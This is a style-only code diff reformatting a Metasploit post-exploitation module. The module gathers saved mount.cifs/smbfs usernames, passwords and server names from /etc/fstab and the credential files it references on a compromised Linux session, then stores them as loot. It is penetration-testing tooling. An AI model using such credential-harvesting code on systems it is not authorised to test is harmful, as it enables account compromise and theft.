@@ -6,18 +6,21 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',
-      'Description'   => %q{
-        Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
-        /etc/fstab on a Linux system.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Jon Hart <jhart[at]spoofed.org>'],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',
+        'Description' => %q{
+          Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
+          /etc/fstab on a Linux system.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Jon Hart <jhart[at]spoofed.org>'],
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter']
+      )
+    )
   end
 
   def run
@@ -27,15 +30,16 @@ class MetasploitModule < Msf::Post
     creds = []
     # A table to store the found credentials for loot storage afterward
     cred_table = Rex::Text::Table.new(
-    'Header'    => "mount.cifs credentials",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "Username",
-      "Password",
-      "Server",
-      "File"
-    ])
+      'Header' => "mount.cifs credentials",
+      'Indent' => 1,
+      'Columns' =>
+      [
+        "Username",
+        "Password",
+        "Server",
+        "File"
+      ]
+    )
 
     # parse each line from /etc/fstab
     fail_with(Failure::NotFound, '/etc/fstab not found on system') unless file_exist?('/etc/fstab')
@@ -53,6 +57,7 @@ class MetasploitModule < Msf::Post
           file = $1
           # skip if we've already parsed this credentials file
           next if (cred_files.include?(file))
+
           # store it if we haven't
           cred_files << file
           # parse the credentials
@@ -93,7 +98,8 @@ class MetasploitModule < Msf::Post
         session,
         cred_table.to_csv,
         "mount_cifs_credentials.txt",
-        "mount.cifs credentials")
+        "mount.cifs credentials"
+      )
       print_status("CIFS credentials saved in: #{p.to_s}")
     end
   end
@@ -128,7 +134,7 @@ class MetasploitModule < Msf::Post
 
   # Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.
   # Returns the username+domain and password as a hash.
-  def parse_fstab_credentials(line, file="/etc/fstab")
+  def parse_fstab_credentials(line, file = "/etc/fstab")
     creds = {}
     # get the username option, which comes in one of four ways
     user_opt = $1 if (line =~ /user(?:name)?=([^, ]+)/)
